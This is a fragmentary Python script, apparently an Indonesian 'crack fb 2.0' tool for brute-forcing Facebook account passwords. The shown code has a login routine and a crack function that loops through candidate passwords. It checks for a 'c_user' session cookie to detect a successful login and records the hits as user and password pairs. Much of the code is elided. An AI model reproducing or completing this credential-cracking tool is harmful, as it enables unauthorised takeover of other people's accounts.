...
│                                                                           crack fb 2.0       │
└──────────────────────────────────────────────────────────────────────────────────────────────┘  	
			{m} ☯︎ {k} ☯︎ {h} ☯︎ {sir} Recode : LUXZY XD 🌎{x}{m} ☯︎ {k} ☯︎ {h} ☯︎ {x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t( ͠° ͟ʖ ͡°) salam dari Jakarta : [green]🇨 🇴 🇰 🇮  [white] (;´༎ຶٹ༎ຶ`)'))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r🌎 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{U}{ok}{P}]—{P}[{H}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[Dhanz-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
